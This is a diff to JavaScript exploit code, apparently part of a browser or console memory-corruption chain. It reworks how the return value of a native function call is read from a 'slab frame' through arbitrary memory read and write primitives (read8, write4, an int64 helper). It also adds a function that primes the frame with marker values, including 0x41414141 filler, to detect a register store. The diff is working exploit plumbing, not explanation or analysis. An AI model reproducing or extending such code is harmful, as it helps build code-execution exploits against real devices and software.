@@ -485,15 +485,39 @@ function resolveNotifyPath(opts) {
     return "direct";
 }
 
-/** Return value captured at slab frame F — prefer native read over DataView. */
-function readCallRet(p, prep) {
-    let ret = prep.M.frameDv.getUint32(0, true) | 0;
+/** Return value captured at slab frame F — prefer native read8 over DataView. */
+function readCallRetDetailed(p, prep) {
+    const dvLo = prep.M.frameDv.getUint32(0, true);
+    const dvHi = prep.M.frameDv.getUint32(4, true);
+    let memLo = dvLo;
+    let memHi = dvHi;
     try {
-        const mem = p.read4(prep.M.F);
-        if (mem != null)
-            ret = (mem | 0);
+        const m = p.read8(prep.M.F);
+        if (m) {
+            memLo = m.low >>> 0;
+            memHi = m.hi >>> 0;
+        }
     } catch (_) { }
-    return ret;
+    return {
+        ret: (memLo | 0),
+        dvLo,
+        dvHi,
+        memLo,
+        memHi,
+    };
+}
+
+export function readCallRet(p, prep) {
+    return readCallRetDetailed(p, prep).ret;
+}
+
+/** Marker written to F before fire — detects mov [rdi], rax store. */
+export function primeCallFrame(p, prep, marker) {
+    marker = marker >>> 0;
+    prep.M.frameDv.setUint32(0, marker, true);
+    prep.M.frameDv.setUint32(4, 0x41414141, true);
+    p.write4(prep.M.F, new int64(marker, 0));
+    p.write4(prep.M.F.add32(4), new int64(0x41414141, 0));
 }
 
 function writeNotifyStructAb(ab, message, iconUri, fmt) {
